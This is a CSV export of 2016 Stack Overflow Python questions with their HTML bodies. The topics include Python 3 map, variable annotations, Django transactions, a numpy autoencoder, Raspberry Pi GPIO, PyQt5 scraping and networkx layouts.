Id,OwnerUserId,CreationDate,Score,Title,Body
40015439,2085376.0,2016-10-13 08:01:41+00:00,20,Why does map return a map object instead of a list in Python 3?,"<p>I am interested in understanding the <a href=""http://stackoverflow.com/questions/1303347/getting-a-map-to-return-a-list-in-python-3-x"">new language design of Python 3.x</a>.</p>

<p>I do enjoy, in Python 2.7, the function <code>map</code>:</p>

<pre><code>Python 2.7.12
In[2]: map(lambda x: x+1, [1,2,3])
Out[2]: [2, 3, 4]
</code></pre>

<p>However, in Python 3.x things have changed:</p>

<pre><code>Python 3.5.1
In[2]: map(lambda x: x+1, [1,2,3])
Out[2]: &lt;map at 0x4218390&gt;
</code></pre>

<p>I understand the how, but I could not find a reference to the why. Why did the language designers make this choice, which, in my opinion, introduces a great deal of pain. Was this to arm-wrestle developers in sticking to list comprehensions?</p>

<p>IMO, list can be naturally thought as <a href=""http://learnyouahaskell.com/functors-applicative-functors-and-monoids"" rel=""nofollow"">Functors</a>; and I have been somehow been thought to think in this way:</p>

<pre><code>fmap :: (a -&gt; b) -&gt; f a -&gt; f b
</code></pre>
"
39971929,1983854.0,2016-10-11 07:00:15+00:00,15,What are variable annotations in Python 3.6?,"<p>Python 3.6 is about to be released. <a href=""https://www.python.org/dev/peps/pep-0494/"">PEP 494 -- Python 3.6 Release Schedule</a> mentions the end of December, so I went through <a href=""https://docs.python.org/3.6/whatsnew/3.6.html"">What's New in Python 3.6</a> to see they mention the <em>variable annotations</em>:</p>

<blockquote>
  <p><a href=""https://www.python.org/dev/peps/pep-0484"">PEP 484</a> introduced standard for type annotations of function parameters, a.k.a. type hints. This PEP adds syntax to Python for annotating the types of variables including class variables and instance variables:</p>

<pre><code>  primes: List[int] = []

  captain: str  # Note: no initial value!

  class Starship:
     stats: Dict[str, int] = {}
</code></pre>
  
  <p>Just as for function annotations, the Python interpreter does not attach any particular meaning to variable annotations and only stores them in a special attribute <code>__annotations__</code> of a class or module. In contrast to variable declarations in statically typed languages, the goal of annotation syntax is to provide an easy way to specify structured type metadata for third party tools and libraries via the abstract syntax tree and the <code>__annotations__</code> attribute.</p>
</blockquote>

<p>So from what I read they are part of the type hints coming from Python 3.5, described in <a href=""http://stackoverflow.com/q/32557920/1983854"">What are Type hints in Python 3.5</a>.</p>

<p>I follow the <code>captain: str</code> and <code>class Starship</code> example, but not sure about the last one: How does <code>primes: List[int] = []</code> explain? Is it defining an empty list that will just allow integers?</p>
"
39719567,633961.0,2016-09-27 08:17:37+00:00,15,Not nesting version of @atomic() in Django?,"<p>From the <a href=""https://docs.djangoproject.com/en/dev/topics/db/transactions/#django.db.transaction.atomic"">docs of atomic()</a></p>

<blockquote>
  <p>atomic blocks can be nested</p>
</blockquote>

<p>This sound like a great feature, but in my use case I want the opposite: I want the transaction to be durable as soon as the block decorated with <code>@atomic()</code> gets left successfully.</p>

<p>Is there a way to ensure durability in django's transaction handling?</p>

<h1>Background</h1>

<p>Transaction are ACID. The ""D"" stands for durability. That's why I think transactions can't be nested without loosing feature ""D"".</p>

<p>Example: If the inner transaction is successful, but the outer transaction is not, then the outer and the inner transaction get rolled back. The result: The inner transaction was not durable.</p>

<p>I use PostgreSQL, but AFAIK this should not matter much.</p>
"
39675844,200783.0,2016-09-24 11:32:53+00:00,15,How do coroutines in Python compare to those in Lua?,"<p>Support for coroutines in Lua is provided by <a href=""https://www.lua.org/manual/5.3/manual.html#2.6"">functions in the <code>coroutine</code> table</a>, primarily <code>create</code>, <code>resume</code> and <code>yield</code>. The developers describe these coroutines as <a href=""http://laser.inf.ethz.ch/2012/slides/Ierusalimschy/coroutines-4.pdf"">stackful, first-class and asymmetric</a>.</p>

<p>Coroutines are also available in Python, either using <a href=""https://www.python.org/dev/peps/pep-0342/"">enhanced generators</a> (and <a href=""https://www.python.org/dev/peps/pep-0380/""><code>yield from</code></a>) or, added in version 3.5, <a href=""https://www.python.org/dev/peps/pep-0492/""><code>async</code> and <code>await</code></a>.</p>

<p>How do coroutines in Python compare to those in Lua? Are they also stackful, first-class and asymmetric?</p>

<p>Why does Python require so many constructs (<code>async def</code>, <code>async with</code>, <code>async for</code>, <a href=""https://www.python.org/dev/peps/pep-0530/"">asynchronous comprehensions</a>, ...) for coroutines, while Lua can provide them with just three built-in functions?</p>
"
39804774,1920178.0,2016-10-01 08:59:04+00:00,13,Stuck implementing simple neural network,"<p>I've been bashing my head against this brick wall for what seems like an eternity, and I just can't seem to wrap my head around it. I'm trying to implement an autoencoder using only numpy and matrix multiplication. No theano or keras tricks allowed.</p>

<p>I'll describe the problem and all its details. It is a bit complex at first since there are a lot of variables, but it really is quite straightforward.</p>

<p><strong>What we know</strong></p>

<p>1) <code>X</code> is an <code>m</code> by <code>n</code> matrix which is our inputs. The inputs are rows of this matrix. Each input is an <code>n</code> dimensional row vector, and we have <code>m</code> of them.</p>

<p>2)The number of neurons in our (single) hidden layer, which is <code>k</code>.</p>

<p>3) The activation function of our neurons (sigmoid, will be denoted as <code>g(x)</code>) and its derivative <code>g'(x)</code></p>

<p><strong>What we don't know and want to find</strong></p>

<p>Overall our goal is to find 6 matrices: <code>w1</code> which is <code>n</code> by <code>k</code>, <code>b1</code> which is <code>m</code> by <code>k</code>, <code>w2</code> which is <code>k</code> by <code>n</code>, b2 which is <code>m</code> by <code>n</code>, <code>w3</code> which is <code>n</code> by <code>n</code> and <code>b3</code> which is <code>m</code> by <code>n</code>.</p>

<p>They are initallized randomly and we find the best solution using gradient descent.</p>

<p><strong>The process</strong></p>

<p>The entire process looks something like this
<a href=""http://i.stack.imgur.com/OQl3g.jpg""><img src=""http://i.stack.imgur.com/OQl3g.jpg"" alt=""enter image description here""></a></p>

<p>First we compute <code>z1 = Xw1+b1</code>. It is <code>m</code> by <code>k</code> and is the input to our hidden layer. We then compute <code>h1 = g(z1)</code>, which is simply applying the sigmoid function to all elements of <code>z1</code>. naturally it is also <code>m</code> by <code>k</code> and is the output of our hidden layer.</p>

<p>We then compute <code>z2 = h1w2+b2</code> which is <code>m</code> by <code>n</code> and is the input to the output layer of our neural network. Then we compute <code>h2 = g(z2)</code> which again is naturally also <code>m</code> by <code>n</code> and is the output of our neural network.</p>

<p>Finally, we take this output and perform some linear operator on it: <code>Xhat = h2w3+b3</code> which is also <code>m</code> by <code>n</code> and is our final result.</p>

<p><strong>Where I am stuck</strong></p>

<p>The cost function I want to minimize is the mean squared error. I already implemented it in numpy code</p>

<pre><code>def cost(x, xhat):
    return (1.0/(2 * m)) * np.trace(np.dot(x-xhat,(x-xhat).T))
</code></pre>

<p>The problem is finding the derivatives of cost with respect to <code>w1,b1,w2,b2,w3,b3</code>. Let's call the cost <code>S</code>.</p>

<p>After deriving myself <strong>and checking myself numerically</strong>, I have established the following facts:</p>

<p>1) <code>dSdxhat = (1/m) * np.dot(xhat-x)</code></p>

<p>2) <code>dSdw3 = np.dot(h2.T,dSdxhat)</code></p>

<p>3) <code>dSdb3 = dSdxhat</code></p>

<p>4) <code>dSdh2 = np.dot(dSdxhat, w3.T)</code></p>

<p>But I can't for the life of me figure out dSdz2. It's a brick wall.</p>

<p>From chain-rule, it should be that dSdz2 = dSdh2 * dh2dz2 but the dimensions don't match. </p>

<p>What is the formula to compute the derivative of S with respect to z2?</p>

<p><strong>Edit</strong> - This is my code for the entire feed forward operation of the autoencoder.</p>

<pre><code>import numpy as np

def g(x): #sigmoid activation functions
    return 1/(1+np.exp(-x)) #same shape as x!

def gGradient(x): #gradient of sigmoid
    return g(x)*(1-g(x)) #same shape as x!

def cost(x, xhat): #mean squared error between x the data and xhat the output of the machine
    return (1.0/(2 * m)) * np.trace(np.dot(x-xhat,(x-xhat).T))

#Just small random numbers so we can test that it's working small scale
m = 5 #num of examples
n = 2 #num of features in each example
k = 2 #num of neurons in the hidden layer of the autoencoder
x = np.random.rand(m, n) #the data, shape (m, n)

w1 = np.random.rand(n, k) #weights from input layer to hidden layer, shape (n, k)
b1 = np.random.rand(m, k) #bias term from input layer to hidden layer (m, k)
z1 = np.dot(x,w1)+b1 #output of the input layer, shape (m, k)
h1 = g(z1) #input of hidden layer, shape (m, k)

w2 = np.random.rand(k, n) #weights from hidden layer to output layer of the autoencoder, shape (k, n)
b2 = np.random.rand(m, n) #bias term from hidden layer to output layer of autoencoder, shape (m, n)
z2 = np.dot(h1, w2)+b2 #output of the hidden layer, shape (m, n)
h2 = g(z2) #Output of the entire autoencoder. The output layer of the autoencoder. shape (m, n)

w3 = np.random.rand(n, n) #weights from output layer of autoencoder to entire output of the machine, shape (n, n)
b3 = np.random.rand(m, n) #bias term from output layer of autoencoder to entire output of the machine, shape (m, n)
xhat = np.dot(h2, w3)+b3 #the output of the machine, which hopefully resembles the original data x, shape (m, n)
</code></pre>
"
39748267,2180332.0,2016-09-28 12:58:06+00:00,13,PYTHONPATH order on Ubuntu 14.04,"<p>I have two computers running Ubuntu 14.04 server (let's call them A and B). B was initially a 10.04 but it has received two upgrades to 12.04 and 14.04. I do not understand why the python path is different on the two computers.</p>

<p>As you can see on the two paths below, the pip installation path <code>/usr/local/lib/python2.7/dist-packages</code> comes <strong>before</strong> the apt python packages path <code>/usr/lib/python2.7/dist-packages</code> on Ubuntu A, but it comes <strong>after</strong> on Ubuntu B.</p>

<p>This leads to several problems if a python package is installed both via apt and pip. As you can see below, if both <code>python-six</code> apt package and <code>six</code> pip package are installed, they may be two different library versions.</p>

<p>The installation of packages system is not always my choice, but might be some dependencies of other packages that are installed.</p>

<p>This problem could probably be solved with a virtualenv, but for reasons I will not detail, <strong>I cannot use virtualenv</strong> here, and must install pip packages system-wide.</p>

<h2>Ubuntu A</h2>

<pre><code>&gt;&gt;&gt; import sys, six
&gt;&gt;&gt; sys.path
['',
 '/usr/local/bin',
 '/usr/lib/python2.7',
 '/usr/lib/python2.7/plat-x86_64-linux-gnu',
 '/usr/lib/python2.7/lib-tk',
 '/usr/lib/python2.7/lib-old',
 '/usr/lib/python2.7/lib-dynload',
 '/usr/local/lib/python2.7/dist-packages',
 '/usr/lib/python2.7/dist-packages',
 '/usr/lib/python2.7/dist-packages/PILcompat',
 '/usr/local/lib/python2.7/dist-packages/IPython/extensions']
&gt;&gt;&gt; six
&lt;module 'six' from '/usr/local/lib/python2.7/dist-packages/six.pyc'&gt;
</code></pre>

<h2>Ubuntu B</h2>

<pre><code>&gt;&gt;&gt; import sys, six
&gt;&gt;&gt; sys.path
['',
 '/usr/local/bin',
 '/usr/lib/python2.7/dist-packages',
 '/usr/lib/python2.7',
 '/usr/lib/python2.7/plat-x86_64-linux-gnu',
 '/usr/lib/python2.7/lib-tk',
 '/usr/lib/python2.7/lib-old',
 '/usr/lib/python2.7/lib-dynload',
 '/usr/local/lib/python2.7/dist-packages',
 '/usr/lib/python2.7/dist-packages/PILcompat',
 '/usr/local/lib/python2.7/dist-packages/IPython/extensions']
&gt;&gt;&gt; six
&gt;&gt;&gt; &lt;module 'six' from '/usr/lib/python2.7/dist-packages/six.pyc'&gt;
</code></pre>

<p>For both machines <code>$PATH</code> is the same, and <code>$PYTHONPATH</code> is empty.</p>

<ul>
<li><p>Why are those PYTHONPATHS different?</p></li>
<li><p>How can I fix the pythonpath order in ""Ubuntu B"" so it will load pip
packages before the system ones, in a system-wide way? Is there a apt package I should reinstall or reconfigure so the
PYTHONPATH would prioritize pip packages ?</p></li>
</ul>
"
39829473,1977965.0,2016-10-03 10:28:14+00:00,13,"cryptography AssertionError: sorry, but this version only supports 100 named groups","<p>I'm installing several python packages via <code>pip install</code> on travis, </p>

<pre><code>language: python
python:
- '2.7'
install:
- pip install -r requirements/env.txt
</code></pre>

<p>Everything worked fine, but today I started getting following error:</p>

<pre><code> Running setup.py install for cryptography
Traceback (most recent call last):
  File ""&lt;string&gt;"", line 1, in &lt;module&gt;
  File ""/tmp/pip-build-hKwMR3/cryptography/setup.py"", line 334, in &lt;module&gt;
    **keywords_with_side_effects(sys.argv)
  File ""/opt/python/2.7.9/lib/python2.7/distutils/core.py"", line 111, in setup
    _setup_distribution = dist = klass(attrs)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/setuptools/dist.py"", line 269, in __init__
    _Distribution.__init__(self,attrs)
  File ""/opt/python/2.7.9/lib/python2.7/distutils/dist.py"", line 287, in __init__
    self.finalize_options()
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/setuptools/dist.py"", line 325, in finalize_options
    ep.load()(self, ep.name, value)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/setuptools_ext.py"", line 181, in cffi_modules
    add_cffi_module(dist, cffi_module)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/setuptools_ext.py"", line 48, in add_cffi_module
    execfile(build_file_name, mod_vars)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/setuptools_ext.py"", line 24, in execfile
    exec(code, glob, glob)
  File ""src/_cffi_src/build_openssl.py"", line 81, in &lt;module&gt;
    extra_link_args=extra_link_args(compiler_type()),
  File ""/tmp/pip-build-hKwMR3/cryptography/src/_cffi_src/utils.py"", line 61, in build_ffi_for_binding
    extra_link_args=extra_link_args,
  File ""/tmp/pip-build-hKwMR3/cryptography/src/_cffi_src/utils.py"", line 70, in build_ffi
    ffi.cdef(cdef_source)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/api.py"", line 105, in cdef
    self._cdef(csource, override=override, packed=packed)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/api.py"", line 119, in _cdef
    self._parser.parse(csource, override=override, **options)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 299, in parse
    self._internal_parse(csource)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 304, in _internal_parse
    ast, macros, csource = self._parse(csource)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 260, in _parse
    ast = _get_parser().parse(csource)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/cffi/cparser.py"", line 40, in _get_parser
    _parser_cache = pycparser.CParser()
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/c_parser.py"", line 87, in __init__
    outputdir=taboutputdir)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/c_lexer.py"", line 66, in build
    self.lexer = lex.lex(object=self, **kwargs)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 911, in lex
    lexobj.readtab(lextab, ldict)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/site-packages/pycparser/ply/lex.py"", line 233, in readtab
    titem.append((re.compile(pat, lextab._lexreflags | re.VERBOSE), _names_to_funcs(func_name, fdict)))
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/re.py"", line 194, in compile
    return _compile(pattern, flags)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/re.py"", line 249, in _compile
    p = sre_compile.compile(pattern, flags)
  File ""/home/travis/virtualenv/python2.7.9/lib/python2.7/sre_compile.py"", line 583, in compile
    ""sorry, but this version only supports 100 named groups""
AssertionError: sorry, but this version only supports 100 named groups
</code></pre>

<p>Solutions?</p>
"
39748285,1194864.0,2016-09-28 12:58:35+00:00,12,Re-compose a Tensor after tensor factorization,"<p>I am trying to decompose a 3D matrix using python library <a href=""https://github.com/mnick/scikit-tensor"">scikit-tensor</a>. I managed to decompose my Tensor (with dimensions 100x50x5) into three matrices. My question is how can I compose the initial matrix again using the decomposed matrix produced with Tensor factorization? I want to check if the decomposition has any meaning. My code is the following:</p>

<pre><code>import logging
from scipy.io.matlab import loadmat
from sktensor import dtensor, cp_als
import numpy as np

//Set logging to DEBUG to see CP-ALS information
logging.basicConfig(level=logging.DEBUG)
T = np.ones((400, 50))
T = dtensor(T)
P, fit, itr, exectimes = cp_als(T, 10, init='random')
// how can I re-compose the Matrix T? TA = np.dot(P.U[0], P.U[1].T)
</code></pre>

<p>I am using the canonical decomposition as provided from the scikit-tensor library function cp_als. Also what is the expected dimensionality of the decomposed matrices?</p>
"
39785577,5740843.0,2016-09-30 07:03:15+00:00,12,Python button functions oddly not doing the same,"<p>I currently have 2 buttons hooked up to my Raspberry Pi (these are the ones with ring LED's in them) and I'm trying to perform this code</p>

<pre><code>#!/usr/bin/env python
import RPi.GPIO as GPIO
import time

GPIO.setmode(GPIO.BCM)
GPIO.setwarnings(False)
GPIO.setup(17, GPIO.OUT) #green LED
GPIO.setup(18, GPIO.OUT) #red LED
GPIO.setup(4, GPIO.IN, GPIO.PUD_UP) #green button
GPIO.setup(27, GPIO.IN, GPIO.PUD_UP) #red button

def remove_events():
        GPIO.remove_event_detect(4)
        GPIO.remove_event_detect(27)

def add_events():
        GPIO.add_event_detect(4, GPIO.FALLING, callback=green, bouncetime=800)
        GPIO.add_event_detect(27, GPIO.FALLING, callback=red, bouncetime=800)

def red(pin):
        remove_events()
        GPIO.output(17, GPIO.LOW)
        print ""red pushed""
        time.sleep(2)
        GPIO.output(17, GPIO.HIGH)
        add_events()

def green(pin):
        remove_events()
        GPIO.output(18, GPIO.LOW)
        print ""green pushed""
        time.sleep(2)
        GPIO.output(18, GPIO.HIGH)
        add_events()

def main():
    while True:
        print ""waiting""
        time.sleep(0.5)

GPIO.output(17, GPIO.HIGH)
GPIO.output(18, GPIO.HIGH)
GPIO.add_event_detect(4, GPIO.FALLING, callback=green, bouncetime=800)
GPIO.add_event_detect(27, GPIO.FALLING, callback=red, bouncetime=800)

if __name__ == ""__main__"":
    main()
</code></pre>

<p>On the surface it looks like a fairly easy script. When a button press is detected:</p>

<ol>
<li>remove the events</li>
<li>print the message </li>
<li>wait 2 seconds before adding the events and turning the LED's back on </li>
</ol>

<p>Which normally works out great when I press the green button. I tried it several times in succession and it works without fail. With the red, however, it works well the first time, and the second time, but after it has completed it second red(pin) cycle the script just stops.</p>

<p>Considering both events are fairly similar, I can't explain why it fails on the end of the 2nd red button.</p>

<p><strong>EDIT: I have changed the pins from red and green respectively (either to different pin's completely or swap them). Either way, it's always the red button code (actually now green button) causes an error. So it seems its' not a physical red button problem, nor a pin problem, this just leaves the code to be at fault...</strong></p>
"
39836725,90848.0,2016-10-03 17:00:54+00:00,12,"How does one add an item to GTK's ""recently used"" file list from Python?","<p>I'm trying to add to the ""recently used"" files list from Python 3 on Ubuntu.</p>

<p>I am able to successfully <em>read</em> the recently used file list like this:</p>

<pre><code>from gi.repository import Gtk
recent_mgr = Gtk.RecentManager.get_default()
for item in recent_mgr.get_items():
    print(item.get_uri())
</code></pre>

<p>This prints out the same list of files I see when I look at ""Recent"" in Nautilus, or look at the ""Recently Used"" place in the file dialog of apps like GIMP.</p>

<p>However, when I tried adding an item like this (where <code>/home/laurence/foo/bar.txt</code> is an existing text file)...</p>

<pre><code>recent_mgr.add_item('file:///home/laurence/foo/bar.txt')
</code></pre>

<p>...the file does not show up in the Recent section of Nautilus or in file dialogs. It doesn't even show up in the results returned by <code>get_items()</code>.</p>

<p>How can I add a file to GTK's recently used file list from Python?</p>
"
39667089,1634460.0,2016-09-23 18:10:01+00:00,11,Python vectorizing nested for loops,"<p>I'd appreciate some help in finding and understanding a pythonic way to optimize the following array manipulations in nested for loops:</p>

<pre><code>def _func(a, b, radius):
    ""Return 0 if a&gt;b, otherwise return 1""
    if distance.euclidean(a, b) &lt; radius:
        return 1
    else:
        return 0

def _make_mask(volume, roi, radius):
    mask = numpy.zeros(volume.shape)
    for x in range(volume.shape[0]):
        for y in range(volume.shape[1]):
            for z in range(volume.shape[2]):
                mask[x, y, z] = _func((x, y, z), roi, radius)
    return mask
</code></pre>

<p>Where <code>volume.shape</code> (182, 218, 200) and <code>roi.shape</code> (3,) are both <code>ndarray</code> types; and <code>radius</code> is an <code>int</code> </p>
"
39804034,3545237.0,2016-10-01 07:21:39+00:00,11,Python scraping of javascript web pages fails for https pages only,"<p>I'm using PyQt5 to scrape web pages, which works great for http:// URLs, but not at all for https:// URLs.</p>

<p>The relevant part of my script is below:</p>

<pre><code>class WebPage(QWebPage):
    def __init__(self):
        super(WebPage, self).__init__()

        self.timerScreen = QTimer()
        self.timerScreen.setInterval(2000)
        self.timerScreen.setSingleShot(True)
        self.timerScreen.timeout.connect(self.handleLoadFinished)

        self.loadFinished.connect(self.timerScreen.start)


    def start(self, urls):
        self._urls = iter(urls)
        self.fetchNext()

    def fetchNext(self):
        try:
            url = next(self._urls)
        except StopIteration:
            return False
        else:
            self.mainFrame().load(QUrl(url))
        return True

    def processCurrentPage(self):
        url = self.mainFrame().url().toString()
        html = self.mainFrame().toHtml()

        #Do stuff with html
        print('loaded: [%d bytes] %s' % (self.bytesReceived(), url))

    def handleLoadFinished(self):
        self.processCurrentPage()
        if not self.fetchNext():
            qApp.quit()
</code></pre>

<p>For secure pages, the script returns a blank page. The only html coming back is <code>&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code>.</p>

<p>I'm at a bit of a loss. Is there a setting that I'm missing related to handling secure URLs?</p>
"
39801880,678572.0,2016-10-01 00:39:45+00:00,11,How to use the `pos` argument in `networkx` to create a flowchart-style Graph? (Python 3),"<p><strong>I am trying create a linear network graph using <code>Python</code></strong> (preferably with <code>matplotlib</code> and <code>networkx</code> although would be interested in <code>bokeh</code>) similar in concept to the one below.  </p>

<p><a href=""http://i.stack.imgur.com/qojHg.png""><img src=""http://i.stack.imgur.com/qojHg.png"" alt=""enter image description here""></a></p>

<p><strong>How can this graph plot be constructed efficiently (<code>pos</code>?) in Python using <code>networkx</code>?</strong>  I want to use this for more complicated examples so I feel that hard coding the positions for this simple example won't be useful :( . Does <code>networkx</code> have a solution to this? </p>

<blockquote>
  <p><a href=""https://networkx.github.io/documentation/development/reference/generated/networkx.drawing.nx_pylab.draw_networkx.html#networkx.drawing.nx_pylab.draw_networkx"">pos (dictionary, optional) â A dictionary with nodes as keys and
  positions as values. If not specified a spring layout positioning will
  be computed. See networkx.layout for functions that compute node
  positions.
  </a></p>
</blockquote>

<p>I haven't seen any tutorials on how this can be achieved in <code>networkx</code> which is why I believe this question will be a reliable resource for the community.  I've extensively gone through the <a href=""https://networkx.github.io/documentation/development/tutorial/index.html""><code>networkx</code> tutorials</a> and nothing like this is on there.  The layouts for <code>networkx</code> would make this type of network impossible to interpret without careful use of the <code>pos</code> argument... which I believe is my only option.  <strong>None of the precomputed layouts on the <a href=""https://networkx.github.io/documentation/networkx-1.9/reference/drawing.html"">https://networkx.github.io/documentation/networkx-1.9/reference/drawing.html</a> documentation seem to handle this type of network structure well.</strong> </p>

<p><strong>Simple Example:</strong></p>

<p>(A) every outer key is the iteration in the graph moving from left to the right (e.g. iteration 0 represents samples, iteration 1 has groups 1 - 3, same with iteration 2, iteration 3 has Groups 1 - 2, etc.).  (B) The inner dictionary contains the current grouping at that particular iteration, and the weights for the previous groups merging that represent the current group (e.g. <code>iteration 3</code> has <code>Group 1</code> and <code>Group 2</code> and for <code>iteration 4</code> all of <code>iteration 3's</code> <code>Group 2</code> has gone into <code>iteration 4's</code> <code>Group 2</code> but <code>iteration 3's</code> <code>Group 1</code> has been split up.  The weights always sum to 1. </p>

<p>My code for the connections w/ weights for the plot above:</p>

<pre><code>D_iter_current_previous =    {
        1: {
            ""Group 1"":{""sample_0"":0.5, ""sample_1"":0.5, ""sample_2"":0, ""sample_3"":0, ""sample_4"":0},
            ""Group 2"":{""sample_0"":0, ""sample_1"":0, ""sample_2"":1, ""sample_3"":0, ""sample_4"":0},
            ""Group 3"":{""sample_0"":0, ""sample_1"":0, ""sample_2"":0, ""sample_3"":0.5, ""sample_4"":0.5}
            },
        2: {
            ""Group 1"":{""Group 1"":1, ""Group 2"":0, ""Group 3"":0},
            ""Group 2"":{""Group 1"":0, ""Group 2"":1, ""Group 3"":0},
            ""Group 3"":{""Group 1"":0, ""Group 2"":0, ""Group 3"":1}
            },
        3: {
            ""Group 1"":{""Group 1"":0.25, ""Group 2"":0, ""Group 3"":0.75},
            ""Group 2"":{""Group 1"":0.25, ""Group 2"":0.75, ""Group 3"":0}
            },
        4: {
            ""Group 1"":{""Group 1"":1, ""Group 2"":0},
            ""Group 2"":{""Group 1"":0.25, ""Group 2"":0.75}
            }
        }
</code></pre>

<p><strong>This is what happened when I made the Graph in <code>networkx</code></strong>:</p>

<pre><code>import networkx
import matplotlib.pyplot as plt

# Create Directed Graph
G = nx.DiGraph()

# Iterate through all connections
for iter_n, D_current_previous in D_iter_current_previous.items():
    for current_group, D_previous_weights in D_current_previous.items():
        for previous_group, weight in D_previous_weights.items():
            if weight &gt; 0:
                # Define connections using `|__|` as a delimiter for the names
                previous_node = ""%d|__|%s""%(iter_n - 1, previous_group)
                current_node = ""%d|__|%s""%(iter_n, current_group)
                connection = (previous_node, current_node)
                G.add_edge(*connection, weight=weight)

# Draw Graph with labels and width thickness
nx.draw(G, with_labels=True, width=[G[u][v]['weight'] for u,v in G.edges()])
</code></pre>

<p><a href=""http://i.stack.imgur.com/aiXnI.png""><img src=""http://i.stack.imgur.com/aiXnI.png"" alt=""enter image description here""></a></p>

<p>Note: The only other way, I could think of to do this would be in <code>matplotlib</code> creating a scatter plot with every tick representing a iteration (5 including the initial samples) then connecting the points to each other with different weights.  This would be some pretty messy code especially trying to line up the edges of the markers w/ the connections...However, I'm not sure if this and <code>networkx</code> is the best way to do it or if there is a tool (e.g. <code>bokeh</code> or <code>plotly</code>) that is designed for this type of plotting.</p>
"
